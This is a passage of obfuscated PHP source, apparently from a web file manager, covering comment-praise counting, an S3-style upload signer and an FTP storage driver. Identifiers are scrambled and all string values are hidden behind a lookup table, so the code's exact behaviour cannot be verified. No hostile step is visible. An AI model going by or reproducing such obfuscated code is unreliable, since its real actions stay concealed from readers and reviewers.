array($›ˆ»ˆ¶ú[2009] => $Ó£¡š“Î, $›ˆ»ˆ¶ú[1769] => USER_ID); $°ì¶à‡¡ = $Â¾ì¸Ş¤->where($…ŠäÙÖÀ)->find(); if (!$°ì¶à‡¡) { $Â¾ì¸Ş¤->add($…ŠäÙÖÀ); $™óÈé³¶ = $this->where(array($›ˆ»ˆ¶ú[2009] => $Ó£¡š“Î))->setAdd($›ˆ»ˆ¶ú[2011], 1); } else { $Â¾ì¸Ş¤->where($…ŠäÙÖÀ)->delete(); $™óÈé³¶ = $this->where(array($›ˆ»ˆ¶ú[2009] => $Ó£¡š“Î))->setAdd($›ˆ»ˆ¶ú[2011], -1); } return $™óÈé³¶; } public function targetInfo($ñşÎ¨Ãö, $¿ÅŠùß) { $¹×åËğ­ =& $_SERVER[¼èá¯æÙ]; $Ìò°÷•¸ = array($¹×åËğ­[662] => $ñşÎ¨Ãö, $¹×åËğ­[663] => $¿ÅŠùß); $êå‹î®í = $this->where($Ìò°÷•¸)->count(); $„ “ø×Ã = "\122\111\107\x48\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\143\x6f\155\x6d\x65\x6e\164\x5f\160\162\x61\x69\163\x65\x20\163\164\x61\162\40\157\156\40\x63\x6f\x6d\155\x65\x6e\164\56\143\x6f\x6d\x6d\x65\x6e\x74\x49\x44\40\75\40\163\x74\141\x72\x2e\143\x6f\155\155\x65\156\x74\x49\x44"; $ÎÊ±ÛŠ” = $this->alias($¹×åËğ­[441])->where($Ìò°÷•¸)->join($„ “ø×Ã, $¹×åËğ­[2020])->count(); $Çß¹ˆš = array($¹×åËğ­[2021] => $êå‹î®í, $¹×åËğ­[2022] => $ÎÊ±ÛŠ”); return $Çß¹ˆš; } public function listData($½¸»ÉßÂ) { $ï¹øà­ƒ =& $_SERVER[¼èá¯æÙ]; if (isset($½¸»ÉßÂ[$ï¹øà­ƒ[2023]])) { if ($½¸»ÉßÂ[$ï¹øà­ƒ[2023]]) { $½¸»ÉßÂ[$ï¹øà­ƒ[2016]] = array($ï¹øà­ƒ[1096], intval($½¸»ÉßÂ[$ï¹øà­ƒ[2023]])); } unset($½¸»ÉßÂ[$ï¹øà­ƒ[2023]]); } if (isset($½¸»ÉßÂ[$ï¹øà­ƒ[2024]])) { if ($½¸»ÉßÂ[$ï¹øà­ƒ[2024]]) { $½¸»ÉßÂ[$ï¹øà­ƒ[2016]] = array($ï¹øà­ƒ[1093], intval($½¸»ÉßÂ[$ï¹øà­ƒ[2024]])); } unset($½¸»ÉßÂ[$ï¹øà­ƒ[2024]]); } return $this->_listData($½¸»ÉßÂ); } private function _listData($ñÊúâ”Á) { $Ñ¶é¡…¾ =& $_SERVER[¼èá¯æÙ]; $Ø²äØû™ = $this->where($ñÊúâ”Á)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ø²äØû™[$Ñ¶é¡…¾[457]]); $this->_listAppendUser($Ø²äØû™[$Ñ¶é¡…¾[457]]); $this->_listAppendMeta($Ø²äØû™[$Ñ¶é¡…¾[457]]); return $Ø²äØû™; } private function _makeOrder() { $ËÅøƒÃ‹ =& $_SERVER[¼èá¯æÙ]; $„ƒ¦Ü = array($ËÅøƒÃ‹[2011], $ËÅøƒÃ‹[2010], $ËÅøƒÃ‹[243]); $«š°Òİ½ = Input::get($ËÅøƒÃ‹[541], $ËÅøƒÃ‹[7], $ËÅøƒÃ‹[508], $„ƒ¦Ü); $œÙ–œš± = Input::get($ËÅøƒÃ‹[542], $ËÅøƒÃ‹[7], $ËÅøƒÃ‹[1771], array($ËÅøƒÃ‹[2025], $ËÅøƒÃ‹[537])); $¨èé´š¬ = $«š°Òİ½ . $ËÅøƒÃ‹[53] . $œÙ–œš±; return $this->order($¨èé´š¬); } private function _listAppendParent(&$™ˆõ§¿Ä) { $×íùÙàÍ =& $_SERVER[¼èá¯æÙ]; $ì¶¶õ›ı = array_unique(array_to_keyvalue($™ˆõ§¿Ä, $×íùÙàÍ[12], $×íùÙàÍ[2008])); $ì¶¶õ›ı = array_remove_value($ì¶¶õ›ı, $×íùÙàÍ[240]); if (!$ì¶¶õ›ı) { return; } $…´Œé¦« = $this->where(array($×íùÙàÍ[2009] => array($×íùÙàÍ[7], $ì¶¶õ›ı)))->select(); $…´Œé¦« = array_to_keyvalue($…´Œé¦«, $×íùÙàÍ[2016]); foreach ($™ˆõ§¿Ä as &$ïŞ”šÛÙ) { if (isset($…´Œé¦«[$ïŞ”šÛÙ[$×íùÙàÍ[2008]]])) { $ïŞ”šÛÙ[$×íùÙàÍ[2026]] = $…´Œé¦«[$ïŞ”šÛÙ[$×íùÙàÍ[2008]]]; } } unset($ïŞ”šÛÙ); } private function _listAppendUser(&$ö¿š) { $Ğ„ã‚ÉÈ =& $_SERVER[¼èá¯æÙ]; $äò‹â®Ì = array_unique(array_to_keyvalue($ö¿š, $Ğ„ã‚ÉÈ[12], $Ğ„ã‚ÉÈ[1778])); $äò‹â®Ì = array_remove_value($äò‹â®Ì, $Ğ„ã‚ÉÈ[240]); if (count($äò‹â®Ì) == 0) { return; } foreach ($ö¿š as $ë¦•½êÏ) { if (isset($ë¦•½êÏ[$Ğ„ã‚ÉÈ[2026]])) { $äò‹â®Ì[] = $ë¦•½êÏ[$Ğ„ã‚ÉÈ[2026]][$Ğ„ã‚ÉÈ[1778]]; } } $Ô»¤ìàı = Model($Ğ„ã‚ÉÈ[608])->userListInfo($äò‹â®Ì); foreach ($ö¿š as &$ë¦•½êÏ) { $ë¦•½êÏ[$Ğ„ã‚ÉÈ[676]] = $Ô»¤ìàı[$ë¦•½êÏ[$Ğ„ã‚ÉÈ[1778]]]; if (isset($ë¦•½êÏ[$Ğ„ã‚ÉÈ[2026]])) { $ë¦•½êÏ[$Ğ„ã‚ÉÈ[2026]][$Ğ„ã‚ÉÈ[676]] = $Ô»¤ìàı[$ë¦•½êÏ[$Ğ„ã‚ÉÈ[2026]][$Ğ„ã‚ÉÈ[1778]]]; } } unset($ë¦•½êÏ); } private function _listAppendMeta(&$¶´İùî) { $ìƒéŞ =& $_SERVER[¼èá¯æÙ]; $ˆº›àÈ = array_unique(array_to_keyvalue($¶´İùî, $ìƒéŞ[12], $ìƒéŞ[2016])); $ˆº›àÈ = array_remove_value($ˆº›àÈ, $ìƒéŞ[240]); if (!$ˆº›àÈ) { return; } foreach ($¶´İùî as $ÉÉ€ãˆø) { if (isset($ÉÉ€ãˆø[$ìƒéŞ[2026]])) { $ˆº›àÈ[] = $ÉÉ€ãˆø[$ìƒéŞ[2026]][$ìƒéŞ[2016]]; } } $ñÜàçáÒ = $this->metaList($ˆº›àÈ); if (!$ñÜàçáÒ) { return !1; } foreach ($¶´İùî as &$ÉÉ€ãˆø) { $ÉÉ€ãˆø[$ìƒéŞ[550]] = $ñÜàçáÒ[$ÉÉ€ãˆø[$ìƒéŞ[2016]]]; if (isset($ÉÉ€ãˆø[$ìƒéŞ[2026]])) { $ÉÉ€ãˆø[$ìƒéŞ[2026]][$ìƒéŞ[550]] = $ñÜàçáÒ[$ÉÉ€ãˆø[$ìƒéŞ[2026]][$ìƒéŞ[2016]]]; } } unset($ÉÉ€ãˆø); } private function metaList($ÅáîÈö¸) { $ôğñ˜Ü =& $_SERVER[¼èá¯æÙ]; if (!$ÅáîÈö¸) { return array(); } $ê‚İ¹ÇÂ = array($ôğñ˜Ü[2016] => array($ôğñ˜Ü[7], $ÅáîÈö¸)); $ı¯å‘âı = Model($ôğñ˜Ü[2027])->where($ê‚İ¹ÇÂ)->select(); $ı¯å‘âı = array_to_keyvalue_group($ı¯å‘âı, $ôğñ˜Ü[2016]); foreach ($ı¯å‘âı as $–‡€·©… => $Ü¥ÇèÃ×) { $™Í€š¦ = array(); foreach ($Ü¥ÇèÃ× as $ Â›ÒÓ˜) { $™Í€š¦[$ Â›ÒÓ˜[$ôğñ˜Ü[107]]] = $ Â›ÒÓ˜[$ôğñ˜Ü[462]]; } $ı¯å‘âı[$–‡€·©…] = $™Í€š¦; } return $ı¯å‘âı ? $ı¯å‘âı : array(); } public function removeTarget($Î¾êÊá€, $ğ®íÕ„Ê) { $ş¨°‡Ç¾ =& $_SERVER[¼èá¯æÙ]; if (!$ğ®íÕ„Ê) { return !0; } $ğ®íÕ„Ê = is_array($ğ®íÕ„Ê) ? $ğ®íÕ„Ê : array($ğ®íÕ„Ê); $Åø«Ó = array($ş¨°‡Ç¾[200] => $Î¾êÊá€, $ş¨°‡Ç¾[580] => array($ş¨°‡Ç¾[7], $ğ®íÕ„Ê)); $ÅÉç³Üâ = $this->field($ş¨°‡Ç¾[2016])->where($Åø«Ó)->select(); $ÊûÌÃÔÓ = array_to_keyvalue($ÅÉç³Üâ, $ş¨°‡Ç¾[12], $ş¨°‡Ç¾[2016]); if (!$ÊûÌÃÔÓ) { return !0; } $Åø«Ó = array($ş¨°‡Ç¾[2016] => array($ş¨°‡Ç¾[7], $ÊûÌÃÔÓ)); $this->where($Åø«Ó)->delete(); Model($ş¨°‡Ç¾[2019])->where($Åø«Ó)->delete(); Model($ş¨°‡Ç¾[2028])->where($Åø«Ó)->delete(); } } goto C‡Ò¹ÉÁ¨; cò¼ë„Áè°: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($ñŠ‚æÛÓ) { parent::__construct($ñŠ‚æÛÓ); $this->setSignVersion($_SERVER[¼èá¯æÙ][259]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ü¨ˆÌó) { parent::__construct($Ü¨ˆÌó); $this->setSignVersion($_SERVER[¼èá¯æÙ][259]); } public function uploadFormData($Ò‰‡Õåê, $¹ãıÔš€ = 3600) { $ÌÄú½¡ =& $_SERVER[¼èá¯æÙ]; $×™‡á¨Â = $ÌÄú½¡[241]; $‡éÄ½‡ = $ÌÄú½¡[269]; $ı÷«…ïı = $ÌÄú½¡[72]; $ˆ¼ğ¼¼ = gmdate($ÌÄú½¡[270]); $Åø²ºŸ½ = gmdate($ÌÄú½¡[271]); $ÙƒËçÉ  = $ÌÄú½¡[272]; $¦½µ±‚ = $¹ãıÔš€ . $ÌÄú½¡[12]; $º²ŞÇ€³ = $ÌÄú½¡[273]; $‰³“åÎ¬ = array($this->accessKey, $Åø²ºŸ½, $this->region, $ı÷«…ïı, $ÙƒËçÉ ); $™Ï±›¡Î = implode($ÌÄú½¡[8], $‰³“åÎ¬); $ôˆÙşŒû = array($ÌÄú½¡[274] => gmdate($ÌÄú½¡[1418], strtotime($ÌÄú½¡[276])), $ÌÄú½¡[277] => array(array($ÌÄú½¡[278] => $this->bucket), array($ÌÄú½¡[317] => $×™‡á¨Â), array($ÌÄú½¡[279], $ÌÄú½¡[280], $ÌÄú½¡[12]), array($ÌÄú½¡[279], $ÌÄú½¡[281], $ÌÄú½¡[12]), array($ÌÄú½¡[279], $ÌÄú½¡[318], $ÌÄú½¡[12]), array($ÌÄú½¡[282] => $º²ŞÇ€³), array($ÌÄú½¡[283] => $™Ï±›¡Î), array($ÌÄú½¡[284] => $‡éÄ½‡), array($ÌÄú½¡[285] => $ˆ¼ğ¼¼), array($ÌÄú½¡[286] => $¦½µ±‚))); $ ´”—— = base64_encode(json_encode($ôˆÙşŒû)); $²™‚ªš¦ = hash_hmac($ÌÄú½¡[287], $Åø²ºŸ½, $ÌÄú½¡[288] . $this->secret, !0); $ËŒ›­Ğ¬ = hash_hmac($ÌÄú½¡[287], $this->region, $²™‚ªš¦, !0); $„æöß¤¨ = hash_hmac($ÌÄú½¡[287], $ı÷«…ïı, $ËŒ›­Ğ¬, !0); $ß¢÷¶âƒ = hash_hmac($ÌÄú½¡[287], $ÙƒËçÉ , $„æöß¤¨, !0); $ªú³Ë•Í = hash_hmac($ÌÄú½¡[287], $ ´”——, $ß¢÷¶âƒ); $ø¬Å¾Óæ = array($ÌÄú½¡[258] => $ÌÄú½¡[12], $ÌÄú½¡[305] => $ÌÄú½¡[12], $ÌÄú½¡[317] => $×™‡á¨Â, $ÌÄú½¡[282] => $º²ŞÇ€³, $ÌÄú½¡[289] => $ ´”——, $ÌÄú½¡[319] => $™Ï±›¡Î, $ÌÄú½¡[320] => $‡éÄ½‡, $ÌÄú½¡[321] => $ˆ¼ğ¼¼, $ÌÄú½¡[322] => $¦½µ±‚, $ÌÄú½¡[323] => $ªú³Ë•Í, $ÌÄú½¡[218] => $this->getHost()); return $ø¬Å¾Óæ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($°Öá­£Ã) { parent::__construct(); if (count($°Öá­£Ã) > 0) { $this->_init($°Öá­£Ã); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($çèÊøÑ) { $Â³†ç¥ =& $_SERVER[¼èá¯æÙ]; global $config; $this->appCharset = $config[$Â³†ç¥[1444]]; $this->systemCharset = $config[$Â³†ç¥[1445]]; if (isset($çèÊøÑ[$Â³†ç¥[1446]]) && $çèÊøÑ[$Â³†ç¥[1446]]) { $this->systemCharset = $çèÊøÑ[$Â³†ç¥[1446]]; } } public function iconvApp($ŒËĞİÅ¥) { return $this->iconvTo($ŒËĞİÅ¥, $this->systemCharset, $this->appCharset); } public function iconvSystem($”Ì÷´Ğ¦) { return $this->iconvTo($”Ì÷´Ğ¦, $this->appCharset, $this->systemCharset); } public function getPathOuter($ü™ã™ª) { $Üƒà·­¨ =& $_SERVER[¼èá¯æÙ]; $§˜åüÇÓ = $this->iconvApp($this->pathBase); $ü™ã™ª = $this->iconvApp($ü™ã™ª); if (substr($§˜åüÇÓ, 0, 2) == $Üƒà·­¨[1416]) { $§˜åüÇÓ = BASIC_PATH . substr($§˜åüÇÓ, 2); } if (substr($ü™ã™ª, 0, 2) == $Üƒà·­¨[1416]) { $ü™ã™ª = BASIC_PATH . substr($ü™ã™ª, 2); } $§˜åüÇÓ = KodIO::clear($§˜åüÇÓ); $ü™ã™ª = KodIO::clear($ü™ã™ª); $ü™ã™ª = substr($ü™ã™ª, strlen($§˜åüÇÓ)); if (empty($this->pathDriver)) { return $ü™ã™ª; } return $this->pathDriver . $Üƒà·­¨[8] . ltrim($ü™ã™ª, $Üƒà·­¨[8]); } private function _init($õù“‰º = array()) { $ÉöÌÄÕß =& $_SERVER[¼èá¯æÙ]; if (!function_exists($ÉöÌÄÕß[1447])) { throw new Exception(LNG($ÉöÌÄÕß[1448])); } $this->config = $õù“‰º; $this->charsetReset($õù“‰º); foreach ($õù“‰º as $¹øÉ½› => $Ìü˜‡ï‚) { if (isset($this->{$¹øÉ½›})) { $this->{$¹øÉ½›} = $Ìü˜‡ï‚; } } return $this->_login($õù“‰º); } private function _login($ô©œò©é) { $Ç¼ÉšÄ =& $_SERVER[¼èá¯æÙ]; static $Ì½’­ŒÚ = array(); $”åÍ÷ø = md5(json_encode($ô©œò©é)); if (isset($Ì½’­ŒÚ[$”åÍ÷ø])) { foreach ($Ì½’­ŒÚ[$”åÍ÷ø] as $Æ–ŒÄ½‹ => $Ù˜ˆµ¶å) { $this->{$Æ–ŒÄ½‹} = $Ù˜ˆµ¶å; } return !0; } $Ğ¾šŸ¹Û = parse_url(trim($this->server, $Ç¼ÉšÄ[8])); $this->host = $Ğ¾šŸ¹Û[$Ç¼ÉšÄ[218]]; $¥Äœäğ– = isset($Ğ¾šŸ¹Û[$Ç¼ÉšÄ[217]]) && $Ğ¾šŸ¹Û[$Ç¼ÉšÄ[217]] == $Ç¼ÉšÄ[1449] ? !0 : !1; $this->scheme = $¥Äœäğ– ? $Ç¼ÉšÄ[1450] : $Ç¼ÉšÄ[1451]; $this->port = isset($Ğ¾šŸ¹Û[$Ç¼ÉšÄ[219]]) ? $Ğ¾šŸ¹Û[$Ç¼ÉšÄ[219]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Ç¼ÉšÄ[1452]) . $this->host . $Ç¼ÉšÄ[4] . $this->port, !0); return !1; } $Ğ¢âú‘Á = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ğ¢âú‘Á) { $this->writeLog(LNG($Ç¼ÉšÄ[1453]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $´‰‡•­ = $this->pasv == $Ç¼ÉšÄ[101] ? !0 : !1; @ftp_pasv($this->connect, $´‰‡•­); $Ì½’­ŒÚ[$”åÍ÷ø] = array($Ç¼ÉšÄ[1454] => $this->connect, $Ç¼ÉšÄ[218] => $this->host, $Ç¼ÉšÄ[217] => $this->scheme, $Ç¼ÉšÄ[219] => $this->port); return $Ğ¢âú‘Á; } private function _isconn($í¢ãò˜å = true) { if (is_resource($this->connect)) { return !0; } if (!$í¢ãò˜å) { return !1; } return $this->_login($this->config); } public function mkfile($©“ùÀÃà, $ƒŞšÜ¿İ = '', $µãúË²ç = REPEAT_RENAME) { if ($this->setContent($©“ùÀÃà, $ƒŞšÜ¿İ)) { return $this->getPathOuter($©“ùÀÃà); } $this->writeLog(LNG($_SERVER[¼èá¯æÙ][1455]), !0); return !1; } public function mkdir($¿§—×Ãç, $¸ÂØ¡ìæ = REPEAT_SKIP) { $»¶Ì¡æ¼ =& $_SERVER[¼èá¯æÙ]; if (!$¿§—×Ãç || $¿§—×Ãç == $»¶Ì¡æ¼[8]) { return !0; } if (!$this->_isconn()) { return !1; } $¿§—×Ãç = $this->iconvSystem($¿§—×Ãç); if ($this->_isFolder($¿§—×Ãç) || @ftp_mkdir($this->connect, $¿§—×Ãç)) { return $this->getPathOuter($¿§—×Ãç); } if (!$this->mkdir($this->pathFather($¿§—×Ãç))) { return !1; } if ($¿§—×Ãç = @ftp_mkdir($this->connect, $¿§—×Ãç)) { return $this->getPathOuter($¿§—×Ãç); } $this->writeLog(__FUNCTION__ . $»¶Ì¡æ¼[1456], !0); return !1; } public function copyFile($šÒ‚ÄÊü, $şˆŞÓÃ) { if (!$this->_isconn()) { return !1; } $›¬ôß© = $this->pathThis($this->iconvSystem($šÒ‚ÄÊü)); $õÅ£Å¤ú = $this->tempFile($›¬ôß©); $ãâ³ªç = $this->iconvApp($õÅ£Å¤ú); $this->download($šÒ‚ÄÊü, $ãâ³ªç); $”ƒŸñ–Í = $this->upload($şˆŞÓÃ, $ãâ³ªç); $this->tempFileRemve($õÅ£Å¤ú); return $”ƒŸñ–Í; } public function moveFile($•ßîò, $»í‚°ó«) { if (!$this->_isconn()) { return !1; } $•ßîò = $this->iconvSystem($•ßîò); $»í‚°ó« = $this->iconvSystem($»í‚°ó«); $¤¯ÅÊ‚Î = @ftp_rename($this->connect, $•ßîò, $»í‚°ó«); if (!$¤¯ÅÊ‚Î) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); return !1; } return $this->getPathOuter($»í‚°ó«); } public function delFile($¹Ì÷÷³–) { if (!$this->_isconn()) { return !1; } $¹Ì÷÷³– = $this->iconvSystem($¹Ì÷÷³–); $Ö«­†á“ = @ftp_delete($this->connect, $¹Ì÷÷³–); if (!$Ö«­†á“) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][1456], !0); } return $Ö«­†á“; } public function delFolder($¼©Óş°) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ÙÇ¤¼ªš = $—–¯öÌµ = array(); $this->fileList($¼©Óş°, $ÙÇ¤¼ªš, $—–¯öÌµ, !0); $this->listItemCache = !0; foreach ($—–¯öÌµ as $õé™‡) { $ÔÎï¶¡Ä = $this->iconvSystem($õé™‡[$_SERVER[¼èá¯æÙ][32]]); $ˆ’ÆÚ•  = @ftp_delete($this->connect, $ÔÎï¶¡Ä); if (!$ˆ’ÆÚ• ) { return !1; } } foreach ($ÙÇ¤¼ªš as $ÔÎï¶¡Ä) { $ÔÎï¶¡Ä = $this->iconvSystem($ÔÎï¶¡Ä); $ˆ’ÆÚ•  = @ftp_rmdir($this->connect, $ÔÎï¶¡Ä); if (!$ˆ’ÆÚ• ) { return !1; } } $¼©Óş° = $this->iconvSystem($¼©Óş°); return @ftp_rmdir($this->connect, $¼©Óş°); } public function rename($çµò„ûô, $×™¨ßØ‡) { $êğùóäÑ =& $_SERVER[¼èá¯æÙ]; if (!$this->_isconn()) { return !1; } $î£œõ€ = $this->fileNameAuto($this->pathFather($çµò„ûô), $×™¨ßØ‡); $î£œõ€ = $this->iconvSystem($î£œõ€); $çµò„ûô = $this->iconvSystem($çµò„ûô); $úˆÖï¸ = $this->pathFather($çµò„ûô); $Ò‰õÍ¶‹ = rtrim($úˆÖï¸, $êğùóäÑ[8]) . $êğùóäÑ[8] . $î£œõ€; $§êëµ‡‘ = @ftp_rename($this->connect, $çµò„ûô, $Ò‰õÍ¶‹); if (!$§êëµ‡‘) { $this->writeLog(__FUNCTION__ . $êğùóäÑ[1456], !0); return !1; } $Ò‰õÍ¶‹ = $this->iconvApp($Ò‰õÍ¶‹); return $this->getPathOuter($Ò‰õÍ¶‹); } private function folderInfo($ñœ™Éš, $˜¡ù¼Ë¥ = false) { $­Àì¦Áü =& $_SERVER[¼èá¯æÙ]; $ğ’ŠÈÓÉ = array($­Àì¦Áü[32] => $this->pathThis($ñœ™Éš), $­Àì¦Áü[97] => $this->getPathOuter($­Àì¦Áü[8] . $ñœ™Éš), $­Àì¦Áü[33] => $­Àì¦Áü[88]); if ($˜¡ù¼Ë¥) { return $ğ’ŠÈÓÉ; } $ğ’ŠÈÓÉ[$­Àì¦Áü[243]] = $ğ’ŠÈÓÉ[$­Àì¦Áü[98]] = 0; $ğ’ŠÈÓÉ[$­Àì¦Áü[244]] = $ğ’ŠÈÓÉ[$­Àì¦Áü[245]] = !0; return $ğ’ŠÈÓÉ; } private function fileInfo($Ãó„£×», $ÄÆÖˆâÂ = false, $­•š­¶ó = array()) { $Î¨°ë¶ =& $_SERVER[¼èá¯æÙ]; $ïĞüÜÒ” = array($Î¨°ë¶[32] => $this->pathThis($Ãó„£×»), $Î¨°ë¶[97] => $this->getPathOuter($Î¨°ë¶[8] . $Ãó„£×»), $Î¨°ë¶[33] => $Î¨°ë¶[242], $Î¨°ë¶[89] => isset($­•š­¶ó[$Î¨°ë¶[89]]) ? $­•š­¶ó[$Î¨°ë¶[89]] : 0, $Î¨°ë¶[179] => $this->ext($Ãó„£×»)); if ($ÄÆÖˆâÂ) { return $ïĞüÜÒ”; } $ïĞüÜÒ”[$Î¨°ë¶[243]] = $ïĞüÜÒ”[$Î¨°ë¶[98]] = 0; $ïĞüÜÒ”[$Î¨°ë¶[244]] = $ïĞüÜÒ”[$Î¨°ë¶[245]] = !0; $ãü‘»˜£ = $this->iconvSystem($Ãó„£×»); $ïĞüÜÒ”[$Î¨°ë¶[98]] = @ftp_mdtm($this->connect, $ãü‘»˜£); if (empty($­•š­¶ó)) { $­•š­¶ó = $this->objectMeta($Ãó„£×»); if (!$­•š­¶ó) { return $ïĞüÜÒ”; } } $ïĞüÜÒ”[$Î¨°ë¶[89]] = $­•š­¶ó[$Î¨°ë¶[89]]; return $ïĞüÜÒ”; } public function size($êÃîŠÑÓ) { $°“‘Úø = $this->objectMeta($êÃîŠÑÓ); return $°“‘Úø ? $°“‘Úø[$_SERVER[¼èá¯æÙ][89]] : 0; } public function info($äšüÑÃ) { if ($this->isFile($äšüÑÃ)) { return $this->fileInfo($äšüÑÃ, 0); } else { if ($this->isFolder($äšüÑÃ)) { return $this->folderInfo($äšüÑÃ); } } return !1; } private function fileList($ä²î·, &$‡¬Æª¨Ã, &$É¹¿İ†™, $Ğ–±ÚŒñ = false) { $ëè¥šŞÇ =& $_SERVER[¼èá¯æÙ]; $ä²î· = $this->iconvSystem($ä²î·); if (!$this->isFolder($ä²î·)) { return !1; } @ftp_chdir($this->connect, $ëè¥šŞÇ[8]); $ä²î· = rtrim($ä²î·, $ëè¥šŞÇ[8]) . $ëè¥šŞÇ[8]; check_abort(); $Ó¥¶½«¤ = @ftp_rawlist($this->connect, $ä²î·); if (!$Ó¥¶½«¤) { $Ó¥¶½«¤ = array(); } $Ú§Œ÷ûÆ = array($ëè¥šŞÇ[10] => 1, $ëè¥šŞÇ[1368] => 1); foreach ($Ó¥¶½«¤ as $ùé‹Û¥Á) { $“†‹ªÒø = $this->_listItem($ùé‹Û¥Á); if ($“†‹ªÒø[0] == $ëè¥šŞÇ[840]) { continue; } $‡›§İ©½ = $“†‹ªÒø[8]; if (empty($‡›§İ©½) && $‡›§İ©½ !== $ëè¥šŞÇ[240] || isset($Ú§Œ÷ûÆ[$‡›§İ©½])) { continue; } $‡›§İ©½ = $this->iconvApp($ä²î· . ltrim($‡›§İ©½, $ëè¥šŞÇ[8])); $·ÏÙô¹¼ = array($ëè¥šŞÇ[32] => $‡›§İ©½, $ëè¥šŞÇ[33] => $ëè¥šŞÇ[242], $ëè¥šŞÇ[89] => $“†‹ªÒø[4]); if (substr($ùé‹Û¥Á, 0, 1) == $ëè¥šŞÇ[1457]) { $·ÏÙô¹¼[$ëè¥šŞÇ[33]] = $ëè¥šŞÇ[88]; $·ÏÙô¹¼[$ëè¥šŞÇ[89]] = 0; } $ÛÎ¦”Ÿ = $·ÏÙô¹¼[$ëè¥šŞÇ[33]] == $ëè¥šŞÇ[88] ? !0 : !1; $this->cacheMethodInfoSet($‡›§İ©½, $ÛÎ¦”Ÿ, $·ÏÙô¹¼); if ($ÛÎ¦”Ÿ) { $‡¬Æª¨Ã[] = $‡›§İ©½; if ($Ğ–±ÚŒñ) { $this->fileList($‡›§İ©½, $‡¬Æª¨Ã, $É¹¿İ†™, $Ğ–±ÚŒñ); } continue; } $É¹¿İ†™[] = $·ÏÙô¹¼; } $this->cacheMethodInfoSet($ä²î·, !0); } private function _listItem($Üèå’¬ê) { if (empty($Üèå’¬ê)) { return array(); } $ÎåÈèç = preg_split($_SERVER[¼èá¯æÙ][1458], $Üèå’¬ê); if (count($ÎåÈèç) <= 9) { return $ÎåÈèç; } $ÎåÈèç[8] = trim(substr($Üèå’¬ê, strpos($Üèå’¬ê, $ÎåÈèç[7]) + strlen($ÎåÈèç[7]))); return array_splice($ÎåÈèç, 0, 9); } public function listPath($«‰ğÒèœ, $ßè¤ø† = false) { $®õöéœ  =& $_SERVER[¼èá¯æÙ]; if (!$this->_isconn()) { return !1; } $“†™ø = $Ëû”»›¤ = array(); $this->fileList($«‰ğÒèœ, $“†™ø, $Ëû”»›¤); foreach ($“†™ø as $ëôÜâ… => $ĞÅ—ğ¢·) { $“†™ø[$ëôÜâ…] = $this->folderInfo($ĞÅ—ğ¢·, $ßè¤ø†); } foreach ($Ëû”»›¤ as $ëôÜâ… => $ĞÅ—ğ¢·) { $Ëû”»›¤[$ëôÜâ…] = $this->fileInfo($ĞÅ—ğ¢·[$®õöéœ [32]], $ßè¤ø†, $ĞÅ—ğ¢·); } return array($®õöéœ [95] => $“†™ø, $®õöéœ [96] => $Ëû”»›¤); } public function has($„¤ôûĞí, $¢îúıÓ = false, $³³ÛºçÍ = true) { $ÂóŞ‘Ùœ =& $_SERVER[¼èá¯æÙ]; $’ÃºÉ“· = $ø¼ˆçÊ = array(); $¬ÅÃµ« = $¢îúıÓ ? !0 : !1; $this->fileList($„¤ôûĞí, $’ÃºÉ“·, $ø¼ˆçÊ, $¬ÅÃµ«); if ($¢îúıÓ) { return array($ÂóŞ‘Ùœ[251] => count($ø¼ˆçÊ), $ÂóŞ‘Ùœ[252] => count($’ÃºÉ“·)); } if ($³³ÛºçÍ) { if (count($ø¼ˆçÊ)) { return !0; } } else { if (count($’ÃºÉ“·)) { return !0; } } return !1; } public function listAll($¾Âè„»Ê) { $‚«ˆ…îš =& $_SERVER[¼èá¯æÙ]; if (!$this->_isconn()) { return !1; } $‘´Š°ğÒ = $…ÕÏÛû = array(); $this->fileList($¾Âè„»Ê, $‘´Š°ğÒ, $…ÕÏÛû, !0); $‚Š”ÏŠ = array_to_keyvalue($…ÕÏÛû, $‚«ˆ…îš[32]); foreach ($‘´Š°ğÒ as $¿·˜–ƒõ) { if (is_string($¿·˜–ƒõ)) { $‚Š”ÏŠ[$¿·˜–ƒõ] = array($‚«ˆ…îš[89] => 0); } } return $this->listAllFiles($¾Âè„»Ê, $‚Š”ÏŠ); } public function getContent($”¼òØ‘) { if (!$this->_isconn()) { return !1; } $”¼òØ‘ = $this->iconvSystem($”¼òØ‘); return $this->fileSubstr($”¼òØ‘); } public function setContent($¡İ±òÂò, $şŞ³ĞƒÖ = '') { if (!$this->_isconn()) { return !1; } $’“à = $this->pathThis($this->iconvSystem($¡İ±òÂò)); $ˆ“¾‚â‹ = $this->tempFile($’“à); file_put_contents($ˆ“¾‚â‹, $şŞ³ĞƒÖ); $º£½àÂã = $this->upload($¡İ±òÂò, $this->iconvApp($ˆ“¾‚â‹)); $this->tempFileRemve($ˆ“¾‚â‹); return $º£½àÂã; } public function fileSubstr($‚¿óÎŞ, $Šìœ¢åº = 0, $ÑÙé¯ˆ® = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($‚¿óÎŞ, $Šìœ¢åº, $ÑÙé¯ˆ®); } private function ftpRequest($”š†íÏÜ, $•¾å£¿Ú = 0, $™ÆŞ¾«ò = false) { $”š†íÏÜ = $this->iconvSystem($”š†íÏÜ); $ñ”Èúñ = $this->scheme . $this->host . $_SERVER[¼èá¯æÙ][4] . $this->port; $Ä¤Ç¬Ç² = curl_init(); curl_setopt($Ä¤Ç¬Ç², CURLOPT_URL, $ñ”Èúñ . $this->pathEncode($”š†íÏÜ)); curl_setopt($Ä¤Ç¬Ç², CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($™ÆŞ¾«ò) { $ÇöÁ„¿š = $•¾å£¿Ú + 